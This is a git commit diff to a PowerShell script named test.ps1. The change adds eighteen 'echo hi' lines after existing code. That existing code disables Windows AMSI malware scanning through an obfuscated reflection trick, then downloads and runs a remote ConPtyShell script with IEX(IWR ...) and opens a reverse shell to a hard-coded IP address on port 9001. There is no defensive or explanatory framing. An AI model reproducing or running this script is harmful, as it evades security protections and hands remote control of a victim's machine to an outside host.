2540e57237f10936dc5fa289d6e4f4eeafbd9f62
mastergaming8 <69425038+mastergaming8@users.noreply.github.com>
2023-02-28 22:08:08 -0300

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -3,3 +3,21 @@ $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 206.189.179.214 9001
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
+echo hi
